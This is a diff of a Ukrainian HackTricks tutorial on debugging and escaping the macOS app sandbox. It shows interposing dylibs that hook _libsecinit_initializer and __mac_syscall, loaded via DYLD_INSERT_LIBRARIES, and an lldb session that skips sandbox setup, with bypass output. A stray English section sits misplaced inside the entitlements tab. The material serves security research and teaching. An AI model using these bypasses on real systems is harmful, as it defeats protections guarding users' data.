@@ -1,4 +1,4 @@
-# Відлагодження та обхід macOS Sandbox
+# macOS Sandbox Debug & Bypass
 
 <details>
 
@@ -9,7 +9,7 @@
 * Якщо ви хочете побачити вашу **компанію в рекламі на HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
 * Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
 * Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.
 
 </details>
@@ -77,18 +77,21 @@
 [**Це дослідження**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) виявило 2 способи обходу пісочниці. Оскільки пісочниця застосовується з userland при завантаженні бібліотеки **libSystem**. Якщо бінарний файл зможе уникнути її завантаження, він ніколи не буде поміщений в пісочницю:
 
 * Якщо бінарний файл був **повністю статично скомпільований**, він може уникнути завантаження цієї бібліотеки.
-* Якщо **бінарний файл не потрібно завантажувати жодні бібліотеки** (оскільки лінкер також є в libSystem), йому не потрібно завантажувати libSystem.&#x20;
+* Якщо **бінарний файл не потрібно завантажувати жодні бібліотеки** (оскільки лінкер також є в libSystem), йому не потрібно завантажувати libSystem.
 
 ### Шелл-коди
 
 Зверніть увагу, що **навіть шелл-коди** в ARM64 повинні бути лінковані в `libSystem.dylib`:
+
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
 ### Повноваження
 
 Зверніть увагу, що навіть якщо деякі **дії** можуть бути **дозволені в пісочниці**, якщо додаток має певне **повноваження**, як у:
+
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -98,15 +101,17 @@ ld: dynamic executables or dylibs must link with libSystem.dylib for architectur
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+
 ### Прохід між введенням
 
 Для отримання додаткової інформації про **Прохід між введенням** перегляньте:
 
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
 #### Прохід між введенням `_libsecinit_initializer` для уникнення пісочниці
+
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -130,6 +135,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
+
 #### Перехоплюйте `__mac_syscall`, щоб уникнути пісочницю
 
 {% code title="interpose.c" %}
@@ -165,6 +171,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -176,6 +183,7 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+
 ### Налагодження та обхід пісочниці за допомогою lldb
 
 Скомпілюємо додаток, який повинен бути у пісочниці:
@@ -190,10 +198,10 @@ system("cat ~/Desktop/del.txt");
 ```
 {% endtab %}
 
-{% tab title="entitlements.xml" %} 
-### macOS Sandbox Debug and Bypass
+{% tab title="entitlements.xml" %}
+#### macOS Sandbox Debug and Bypass
 
-#### Debugging the Sandbox
+**Debugging the Sandbox**
 
 To debug the macOS sandbox, you can use the `sandbox-exec` tool with the `-D` flag to enable debug mode. This will print detailed information about the sandbox violations.
 
@@ -201,11 +209,12 @@ To debug the macOS sandbox, you can use the `sandbox-exec` tool with the `-D` fl
 sandbox-exec -D
 ```
 
-#### Bypassing the Sandbox
+**Bypassing the Sandbox**
 
 To bypass the macOS sandbox, you can use various techniques such as exploiting vulnerabilities in the sandbox profile, injecting code into a process with sandbox permissions, or using signed system binaries to execute code outside the sandbox restrictions.
 
 Remember that bypassing the macOS sandbox is a serious security issue and should only be done for ethical hacking and research purposes.
+
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
@@ -247,12 +256,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% hint style="danger" %}
 Додаток спробує **прочитати** файл **`~/Desktop/del.txt`**, який **Пісочниця не дозволить**.\
 Створіть файл там, оскільки після обхіду Пісочниці він зможе його прочитати:
+
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
 Давайте відлагодимо додаток, щоб побачити, коли завантажується пісочниця:
+
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -329,6 +340,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
+
 {% hint style="warning" %}
 **Навіть якщо обійти пісочницю, TCC** запитає користувача, чи він хоче дозволити процесу читати файли з робочого столу
 {% endhint %}
@@ -348,7 +360,7 @@ Process 2517 exited with status = 0 (0x00000000)
 * Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
 * Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
 * Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**
 
 </details>
